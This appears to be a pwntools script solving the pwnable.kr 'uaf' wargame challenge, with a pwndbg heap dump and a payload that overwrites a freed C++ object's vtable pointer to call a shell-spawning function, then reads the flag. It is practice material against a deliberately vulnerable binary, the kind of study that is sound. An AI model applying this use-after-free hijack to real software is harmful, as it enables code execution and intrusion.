from pwn import *

context.log_level = "DEBUG"

s = ssh(host='pwnable.kr', port=2222, user='uaf', password='guest')
#s.download_file('uaf')
#s.download_file('uaf.cpp')

"""
pwndbg> x/32x 0x614c50-16
0x614c40:       0x0000000000000000      0x0000000000000021
0x614c50:       0x4141414141414141      0x4141414141414141
0x614c60:       0x0000000041414141      0x0000000000000031
0x614c70:       0x0000000000614c10      0x0000000000000004
0x614c80:       0x00000000ffffffff      0x000000006c6c694a
0x614c90:       0x0000000000000000      0x0000000000000021
0x614ca0:       0x4141414141414141      0x4141414141414141
0x614cb0:       0x0000000041414141      0x0000000000000411
0x614cc0:       0x320a657375202e31      0x0a7265746661202e
0x614cd0:       0x0a65657266202e33      0x0000000000000000
"""

# place pointer to give shell at 0x614c50

#RBX  0x614ca0  0x401550  0x40117a (Human::give_shell())  push   rbp

payload = p64(0x401550-8) + "A"*12

fp = open('13371337', 'wb+')
fp.write(payload)
fp.close()

s.put('13371337', '/tmp/13371337')

# steps
# 3, 2, 2, 1
# free, alloc, alloc, use

p = s.process(["./uaf", "20", "/tmp/13371337"])

p.sendline('3')
p.recv()
p.sendline('2')
p.recv()
p.sendline('2')
p.recv()
p.sendline('1')
p.recv()

p.sendline('cat flag')
p.recv()

p.interactive()
